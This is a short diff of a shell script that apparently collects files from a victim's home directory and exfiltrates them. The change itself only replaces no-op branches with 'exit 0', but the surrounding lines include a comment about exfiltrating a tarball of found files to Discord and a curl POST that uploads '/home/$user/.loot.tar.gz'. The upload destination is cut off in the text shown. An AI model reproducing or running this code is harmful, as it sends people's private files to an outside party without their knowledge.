@@ -57,10 +57,10 @@ if net_check; then
     if file_check; then
         tarball
     else
-        :
+        exit 0
     fi
 else
-    :
+    exit 0
 fi
 
 # Exfiltrate tarball of found files to Discord:
@@ -106,10 +106,10 @@ if net_check; then
     if file_check; then
         tarball
     else
-        :
+        exit 0
     fi
 else
-    :
+    exit 0
 fi
 curl -X POST -H "Content-Type: multipart/form-data" \
 -F "file=@/home/$user/.loot.tar.gz" \
